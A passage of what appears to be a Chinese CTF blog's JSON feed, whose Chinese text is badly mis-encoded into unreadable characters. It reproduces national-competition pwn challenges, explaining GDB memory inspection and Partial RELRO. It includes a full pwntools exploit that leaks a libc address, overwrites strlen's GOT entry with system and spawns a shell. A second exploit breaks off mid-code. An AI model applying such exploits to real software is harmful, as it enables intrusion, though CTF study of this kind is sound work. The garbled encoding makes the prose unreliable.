ÈªòËÆ§ÊòØ 4 ‰∏™ bytes„ÄÇu ÂèÇÊï∞ÂèØ‰ª•Áî®‰∏ãÈù¢ÁöÑÂ≠óÁ¨¶Êù•‰ª£ÊõøÔºåb Ë°®Á§∫ÂçïÂ≠óËäÇÔºåh Ë°®Á§∫ÂèåÂ≠óËäÇÔºåw Ë°®Á§∫ÂõõÂ≠ó ËäÇÔºåg Ë°®Á§∫ÂÖ´Â≠óËäÇ„ÄÇÂΩìÊàë‰ª¨ÊåáÂÆö‰∫ÜÂ≠óËäÇÈïøÂ∫¶ÂêéÔºåGDB ‰ºö‰ªéÊåáÂÜÖÂ≠òÂÆöÁöÑÂÜÖÂ≠òÂú∞ÂùÄÂºÄÂßãÔºåËØªÂÜôÊåáÂÆöÂ≠óËäÇÔºåÂπ∂ÊääÂÖ∂ÂΩì‰Ωú‰∏Ä‰∏™ÂÄºÂèñÂá∫Êù•„ÄÇ</p>\n<p>x /10gx 0x123456 // Â∏∏Áî®Ôºå‰ªé 0x123456 ÂºÄÂßãÊØè‰∏™ÂçïÂÖÉÂÖ´‰∏™Â≠óËäÇÔºåÂçÅÂÖ≠ËøõÂà∂ÊòæÁ§∫ÊòØ‰∏™ÂçïÂÖÉÁöÑÊï∞ÊçÆ</p>\n<p>x /10xd $rdi // ‰ªé rdi ÊåáÂêëÁöÑÂú∞ÂùÄÂêëÂêéÊâìÂç∞ 10 ‰∏™ÂçïÂÖÉÔºåÊØè‰∏™ÂçïÂÖÉ 4 Â≠óËäÇÁöÑÂçÅËøõÂà∂Êï∞</p>\n<p>x /10i 0x123456 // Â∏∏Áî®Ôºå‰ªé 0x123456 Â§ÑÂêëÂêéÊòæÁ§∫ÂçÅÊù°Ê±áÁºñÊåá‰ª§</p>\n",
            "tags": [
                "csu",
                "rop",
                "gdb"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "url": "http://example.com/2023/08/03/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
            "title": "ÂõΩËµõÂ§çÁé∞",
            "date_published": "2023-08-03T09:17:58.000Z",
            "content_html": "<h1 id=\"ÂõΩËµõÈ¢òÂ§çÁé∞\"><a class=\"markdownIt-Anchor\" href=\"#ÂõΩËµõÈ¢òÂ§çÁé∞\">#</a> ÂõΩËµõÈ¢òÂ§çÁé∞</h1>\n<p>‰∏çÂêåÂú∞Âå∫ÁöÑÂõΩËµõÈ¢òÔºåËøõË°åÂ§çÁé∞„ÄÇ‚Äî ÁÆÄÂçï pwn È¢ò</p>\n<h3 id=\"ÂçéÂåóËµõÂå∫\"><a class=\"markdownIt-Anchor\" href=\"#ÂçéÂåóËµõÂå∫\">#</a> ÂçéÂåóËµõÂå∫Ôºö</h3>\n<h3 id=\"relro‰øùÊä§Êú∫Âà∂\"><a class=\"markdownIt-Anchor\" href=\"#relro‰øùÊä§Êú∫Âà∂\">#</a> RELRO ‰øùÊä§Êú∫Âà∂</h3>\n<p><strong>1.RELRO ÁöÑ‰øùÊä§Êú∫Âà∂ÂèØÁî®‰∫éÈò≤Êä§ <code>GOT hijacking</code> ÔºåÂÖ∂ÂÖ®Âêç‰∏∫ <code>Relocation Read-Only</code> „ÄÇ</strong></p>\n<p><strong>2. Êú¨È¢ò‰∏≠ <code>checksec</code>  ‰∏≠‰∏∫ <code>Partial RELRO</code> ÔºåËøôÁßçÊÉÖÂÜµ‰∏ãÔºå <code>GOT</code>  ÂèØÂÜôÔºåÂç≥Â≠òÂú® <code>GOT hijacking</code>  ÁöÑÊºèÊ¥û</strong></p>\n<p><strong>3. ËÄå‰øùÊä§ÁöÑÊñπÂºèÊòØËÆæÁΩÆ‰∏∫ <code>Full RELRO</code> ÔºåËøôÁßçÊÉÖÂÜµ‰∏ã‰∏ç‰ºöÂá∫Áé∞ <code>lazy binding</code> ÔºåÂõ†‰∏∫Âú® <code>Load time</code>  Êó∂‰ºöÂ∞ÜÊâÄÊúâ <code>funciton resolve</code>  ÂÆåÊØïÔºåÂπ∂ËÆæÁΩÆ <code>GOT</code>  ‰∏çÂèØÂÜô„ÄÇ</strong></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090133980.png\" alt=\"image-20230717090133980\"></p>\n<p>ÁªôÂà∞ÁöÑÈôÑ‰ª∂ÊòØËøô‰∏§‰∏™„ÄÇ</p>\n<h5 id=\"Ê£ÄÊü•Á®ãÂ∫è\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•Á®ãÂ∫è\">#</a> Ê£ÄÊü•Á®ãÂ∫è</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090248188.png\" alt=\"image-20230717090248188\"></p>\n<p>ÂºÄÂêØ‰∫ÜÂ†ÜÊ†à‰∏çÂèØÊâßË°åÂíå pie ‰øùÊä§„ÄÇ</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090403892.png\" alt=\"image-20230717090403892\"></p>\n<p>ÊôÆÈÄöÁöÑÊâßË°åÂπ∂Ê≤°ÊúâÂèëÁé∞‰ªÄ‰πà‰∏úË•ø</p>\n<h5 id=\"ÊîæÂÖ•ida\"><a class=\"markdownIt-Anchor\" href=\"#ÊîæÂÖ•ida\">#</a> ÊîæÂÖ• IDA</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/OLUQRFR5HLPTU%258MV3M%259%5DR.png\" alt=\"img\"></p>\n<p>ËøôÊòØÁªôÂà∞ÁöÑÂá†‰∏™ÂáΩÊï∞</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090604786.png\" alt=\"image-20230717090604786\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090621694.png\" alt=\"image-20230717090621694\"></p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717090637164.png\" alt=\"image-20230717090637164\"></p>\n<p>ËøôÊòØÂÖ∂‰∏≠ÊúâÁî®ÁöÑÂáΩÊï∞ÔºåÊé•‰∏ãÊù•ËøõË°åÂàÜÊûê</p>\n<ol>\n<li></li>\n</ol>\n<p>ÂÖ∂‰∏≠ v2 Êï∞ÁªÑÂú®‰ªñÁöÑÁ¥¢Âºï 0 ÁöÑ‰ΩçÁΩÆÊúâ puts ÂáΩÊï∞ÁöÑÂú∞ÂùÄ„ÄÇ</p>\n<p>main ÂáΩÊï∞ÊòæÁ§∫Ë∞ÉÁî®‰∫Ü 96B Ëøô‰∏™ÂáΩÊï∞Ôºå96B ÂÜÖÊúâ‰∏™ scanf ÂáΩÊï∞Ôºå‰ªñÁöÑÂèÇÊï∞ÊòØ %252sÔºåËøôÈáåË¶ÅËÆ∞‰ΩèÔºåË¶ÅÁî®Âà∞ÔºåÂæÄ‰∏ãÁúãÔºåËøòÊúâÊòØ sacnfÔºåËøôÈáå‰∏ªË¶ÅÊòØÁªïËøáÂà§Êñ≠ÁöÑ„ÄÇÂè™Ë¶ÅÁªïËøáËøô‰∏™Âà§Êñ≠ÔºåÊàë‰ª¨Â∞±ËÉΩÂæóÂà∞ v2 ÁöÑÁ¥¢Âºï 0 Â§ÑÁöÑÂú∞ÂùÄ„ÄÇ</p>\n<p><strong>ÂèÇÊï∞ % s</strong><br>\n<strong>% s ÂèÇÊï∞Âú® PWN È¢ò‰∏≠ÁöÑÂ∫îÁî®Â∫îËØ•ÊòØÊúÄÂ∏∏ËßÅÁöÑ‰∫Ü„ÄÇscanf (‚Äú% s‚Äù, a) ÂÆûÈôÖ‰∏ä‰∏é gets ‰∏ÄÊ†∑Âç±Èô©ÔºåÂùá‰∏ç‰ºöÊ£ÄÊü• a ÁöÑËæπÁïåÔºåÂá∫Áé∞Âú®È¢ò‰∏≠‰∏ÄÂÆöÊòØ‰∏Ä‰∏™ÂèØ‰ª•ËøõË°åÊ†àÊ∫¢Âá∫ÊàñÂ†ÜÊ∫¢Âá∫ÁöÑÈáçÁÇπ„ÄÇËøôÈáåÊ≥®ÊÑèÂÖ∂‰∏é read ÂáΩÊï∞Áõ∏ÂêåÔºåÂèØ‰ª•ËØªÂèñ \\x00 ÂêéÈù¢ÁöÑÂÜÖÂÆπÔºå‰ªÖÂ∞ÜÊç¢Ë°å‰Ωú‰∏∫ËæìÂÖ•ËØªÂèñÁöÑÁªìÊùüÊ†áÂøó„ÄÇ‰∏çËøáËøôÈáåË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºå% s ÂèÇÊï∞‰ºö‰ª•Á©∫Ê†º‰Ωú‰∏∫ÂàÜÈöîÁ¨¶Ôºå‰πüÂ∞±ÊòØËØ¥ÔºåÂ¶ÇÊûúËæìÂÖ•‰∏≠Âê´ÊúâÁ©∫Ê†ºÔºåÈÇ£‰πàÁ©∫Ê†ºÂâçÂêéÁöÑÂÜÖÂÆπ‰ºöË¢´ÂàÜÈÖçÂà∞‰∏çÂêåÁöÑ % s ÂèÇÊï∞‰∏≠„ÄÇËøô‰∏ÄÁÇπÂú®‰ΩøÁî® scanf ËøõË°åÊ∫¢Âá∫Êó∂ÈúÄË¶ÅÊ≥®ÊÑèÔºåÂê¶ÂàôÂÆπÊòìÈÄ†Êàê ROP ÈìæÊñ≠Ë£ÇÁ≠âÈóÆÈ¢ò„ÄÇ</strong></p>\n<p>ÈáåÈù¢ V4 ÊòØ‰∏™Â±ÄÈÉ®ÂèòÈáèÔºåËøôÊ†∑Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Á¨¨‰∏Ä‰∏™ scanf ÊääÂÆÉË¶ÜÁõñÊàê 0„ÄÇÁ¨¨‰∏Ä‰∏™ÂáΩÊï∞Êàë‰ª¨ÊÄùË∑ØÊúâ‰∫ÜÔºåÊé•‰∏ãÊù•Â∞±ÊòØÁ¨¨‰∫å‰∏™ÂáΩÊï∞ÁöÑÊÄùË∑Ø„ÄÇ</p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>Á¨¨‰∏â‰∏™ scanfÔºåËøôÊòØÁî®Êù•ÁªïËøáÂà§Êñ≠ÁöÑ„ÄÇ‰∏ÄÂÖ±Êúâ‰∏§‰∏™ read ÂáΩÊï∞ÔºåÁ¨¨‰∏Ä‰∏™ read ÂáΩÊï∞Ê≤°Âï•Áî®ÔºåÊúâÊÑèÊÄùÁöÑÂ∞±ÊòØÁ¨¨‰∫å‰∏™ read ÂáΩÊï∞„ÄÇ</p>\n<pre><code>Ê†à‰∏≠ÁöÑÊï∞ÁªÑË∂äÁïåÔºö\nÂõ†‰∏∫Ê†àÊòØÂêë‰∏ãÂ¢ûÈïøÁöÑÔºåÂú®ËøõÂÖ•‰∏Ä‰∏™ÂáΩÊï∞‰πãÂâçÔºå‰ºöÂÖàÊääÂèÇÊï∞Âíå‰∏ã‰∏ÄÊ≠•Ë¶ÅÊâßË°åÁöÑÊåá‰ª§Âú∞ÂùÄÔºàÈÄöËøácallÂÆûÁé∞ÔºâÂéãÊ†àÔºåÂú®ÂáΩÊï∞ÁöÑÂÖ•Âè£‰ºöÊääebpÂéãÊ†àÔºåÂπ∂ÊääespËµãÂÄºÁªôebpÔºåÂú®ÂáΩÊï∞ËøîÂõûÁöÑÊó∂ÂÄôÔºåÂ∞ÜebpÂÄºËµãÁªôespÔºåpopÂÖàÂâçÊ†àÂÜÖÁöÑ‰∏äÁ∫ßÂáΩÊï∞Ê†àÁöÑÂü∫Âú∞ÂùÄÁªôebpÔºåÊÅ¢Â§çÂéüÊ†àÂü∫ÂùÄÔºåÁÑ∂ÂêéÊääË∞ÉÁî®ÂáΩÊï∞‰πãÂâçÁöÑÂéãÂÖ•Ê†àÁöÑÊåá‰ª§Âú∞ÂùÄpopÂá∫Êù•ÔºàÈÄöËøáretÂÆûÁé∞Ôºâ„ÄÇ\nÊ†àÊòØÁî±È´òÂæÄ‰ΩéÂ¢ûÈïøÁöÑÔºåËÄåÊï∞ÁªÑÁöÑÂ≠òÂÇ®ÊòØÁî±‰Ωé‰ΩçÂæÄÈ´ò‰ΩçÂ≠òÁöÑÔºåÂ¶ÇÊûúË∂äÁïåÁöÑËØùÔºå‰ºöÊääÂΩìÂâçÂáΩÊï∞ÁöÑebpÂíå‰∏ã‰∏ÄË∑≥ÁöÑÊåá‰ª§Âú∞ÂùÄË¶ÜÁõñÊéâÔºåÂ¶ÇÊûúË¶ÜÁõñ‰∫ÜÂΩìÂâçÂáΩÊï∞ÁöÑebpÔºåÈÇ£‰πàÂú®ÊÅ¢Â§çÁöÑÊó∂ÂÄôespÂ∞±‰∏çËÉΩÊåáÂêëÊ≠£Á°ÆÁöÑÂú∞ÊñπÔºå‰ªéËÄåÂØºËá¥Êú™ÂèØÁü•ÁöÑÊÉÖÂÜµÔºåÂ¶ÇÊûú‰∏ã‰∏ÄË∑≥ÁöÑÂú∞ÂùÄ‰πüË¢´Ë¶ÜÁõñÊéâÔºåÈÇ£‰πàËÇØÂÆö‰ºöÂØºËá¥crash„ÄÇ\n</code></pre>\n<p>ÊâÄ‰ª•ÈÄöËøáÁ¨¨‰∫å‰∏™ read ÂáΩÊï∞ÔºåÂéªÊéßÂà∂‰øÆÊîπÂú∞ÂùÄ„ÄÇÈ¶ñÂÖàÂ∞±ÊòØÂéªÂÅöÂà∞Ë¶ÜÁõñÔºåËøôÁßçË¶ÜÁõñ‰πüÊòØÁ¨¨‰∏ÄÊ¨°ËßÅÔºåÊòØÁúã bss ÊÆµÈáåÂ§ßÂ∞èÂéªË¶ÜÁõñ„ÄÇ</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143008203.png\" alt=\"image-20230717143008203\"></p>\n<p>Ë¶ÜÁõñ 0x1c Â≠óËäÇÂ§ßÂ∞èÔºåË¶ÜÁõñÂÆåÂêéÂéª‰øÆÊîπÂú∞ÂùÄÔºå‰ΩÜÊòØÂõ†‰∏∫ v0 ÊòØÈÄöËøá rax ÂéªÂ≠òÂèÇÁöÑÔºåÊâÄ‰ª•ÈúÄË¶ÅÂéª‰º†‰∏§ÈÅçÂèÇÔºåÊ≠£Â•ΩÊúâ‰∏§Ê¨°‰º†ÂèÇÊú∫‰ºöÔºåÊàë‰ª¨ÂèØ‰ª•Âéª‰øÆÊîπ close ÂáΩÊï∞ÔºåÂèòÊàê‰∏Ä‰∏™Êàë‰ª¨ÊÉ≥Ë¶ÅÂéªÁ®ãÂ∫èÊâßË°åÁöÑÂáΩÊï∞„ÄÇ</p>\n<p>ËøôÈáåÊàë‰ª¨Ë¶ÅÈáçÊñ∞ËøîÂõûÊâßË°å A31 Ëøô‰∏™ÂáΩÊï∞ÔºåÊé•‰∏ãÊù•Â∞±ÊòØÈáçÂ§¥ÊàèÔºåÂéª‰øÆÊîπ got Ë°®„ÄÇ</p>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230717143729215.png\" alt=\"image-20230717143729215\"></p>\n<p>ÈùûÂ∏∏ÂÖ≥ÈîÆ‰∏ÄÁÇπÂ∞±ÊòØËøôÈáåÔºåÊàë‰ª¨ÂèØ‰ª•‰øÆÊîπ strlen ÂáΩÊï∞ÔºåÂèòÊàê system ÂáΩÊï∞ÔºåÂú®Áªô‰ªñ‰º†‰∏™ bin/sh Âç≥ÂèØ</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'split'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    io <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    io <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfc</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'challen'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Good luck!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'22'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'gift:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>strlen_addr <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'strlen'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>strlen_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'index>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># sleep(0.1)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\"># gdb.debug()</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>paylaod <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x88\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>paylaod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># io.recvuntil(b'bye~\\n')</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\"># payload1 = b'\\xe0\\xef'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x31\\x0a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">b'c'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'\\x78\\xff\\xff\\xff'</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'bye~\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\"># gdb.attach(io)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input>>\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># io.send(b'a')</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"Âçé‰∏úËµõÂå∫\"><a class=\"markdownIt-Anchor\" href=\"#Âçé‰∏úËµõÂå∫\">#</a> Âçé‰∏úËµõÂå∫Ôºö</h3>\n<h5 id=\"Ê£ÄÊü•Á®ãÂ∫è-2\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•Á®ãÂ∫è-2\">#</a> Ê£ÄÊü•Á®ãÂ∫èÔºö</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171805702.png\" alt=\"image-20230722171805702\"></p>\n<h5 id=\"ÊâßË°åÁ®ãÂ∫è\"><a class=\"markdownIt-Anchor\" href=\"#ÊâßË°åÁ®ãÂ∫è\">#</a> ÊâßË°åÁ®ãÂ∫èÔºö</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722171849970.png\" alt=\"image-20230722171849970\"></p>\n<h5 id=\"ÊîæÂÖ•ida-2\"><a class=\"markdownIt-Anchor\" href=\"#ÊîæÂÖ•ida-2\">#</a> ÊîæÂÖ• IDAÔºö</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172024544.png\" alt=\"image-20230722172024544\"></p>\n<h5 id=\"ÂèëÁé∞ÊºèÊ¥ûÂáΩÊï∞\"><a class=\"markdownIt-Anchor\" href=\"#ÂèëÁé∞ÊºèÊ¥ûÂáΩÊï∞\">#</a> ÂèëÁé∞ÊºèÊ¥ûÂáΩÊï∞Ôºö</h5>\n<p><img data-src=\"/img/%E5%9B%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20230722172050505.png\" alt=\"image-20230722172050505\"></p>\n<p>Êï¥‰ΩìÊÄùË∑ØÔºåÁªïËøáÈöèÊú∫Êï∞Ê£ÄÊü•Âà§Êñ≠ÔºåÂà∞ËææÊºèÊ¥ûÂáΩÊï∞ÔºåËé∑Âèñ shell„ÄÇseed ÁßçÂ≠êÊòØ 4 Â≠óËäÇÂ§ßÂ∞èË¶ÅÊ≥®ÊÑè</p>\n<h5 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> exp:</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    p <span class=\"token operator\">=</span> 